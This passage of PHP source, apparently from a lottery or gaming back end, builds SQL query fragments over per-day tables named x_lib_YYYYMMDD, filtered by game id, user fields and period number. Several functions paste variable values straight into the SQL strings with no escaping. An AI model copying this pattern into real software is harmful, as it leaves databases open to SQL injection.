   }else{
       return "禁用";
   }
}
function getdatearr($v1,$v2,$thisday,$tb){

    $arr=[];
    $start= strtotime($v1);
    if(strpos($tb,str_replace('-', '', $v1))!==false || $v1==$thisday){
        $arr[] = $v1;
    }  
    
    while(1){
        if(date("Y-m-d",$start)>=$thisday){
            break;
        }
        if(date("Y-m-d",$start)>=$v2){
            break;
        }
        $start += 86400;
        $d = date("Y-m-d",$start);
        if(strpos($tb,str_replace('-', '', $d))!==false || $d==$thisday){
            $arr[] = $d;
        }        
    }
    return $arr;
}

function getsqls($date,$game,$u,$thisday,$qishu=""){

    $whi=[];
    foreach ($date as $v) {
        if($v==$thisday){
            $w1 = " from `x_lib` ";
        }else{
            $w1 = " from `x_lib_".str_replace('-', '', $v)."` ";
        }
        foreach($u as $k2 => $v2){
            if($qishu!="" && is_numeric($qishu)){
                if(count($game)==1){
                    $whi[] = $w1 . " where $k2='$v2' and gid = '".$game[0]."' and qishu='$qishu' ";
                }else{
                    $whi[] = $w1 . " where $k2='$v2' and qishu='$qishu' and gid in(".implode(',', $game).") ";
                }
            }else{
                if(count($game)==1){
                    $whi[] = $w1 . " where $k2='$v2' and gid = '".$game[0]."'";
                }else{
                    $whi[] = $w1 . " where $k2='$v2' and gid in(".implode(',', $game).") ";
                }
            }
            
        }
    }
    return $whi;
}
function getsqls2($date,$game,$u,$thisday){

    $whi=[];
    foreach ($date as $v) {
        if($v==$thisday){
            $w1 = " from `x_lib` ";
        }else{
            $w1 = " from `x_lib_".str_replace('-', '', $v)."` ";
        }
        foreach($game as $v1){
            $w2 = $w1 . " where gid='$v1' ";  
            foreach($u as $k2 => $v2){
                $whi[] = $w2 . " and $k2='$v2' ";
            }
        }
    }
    return $whi;
}

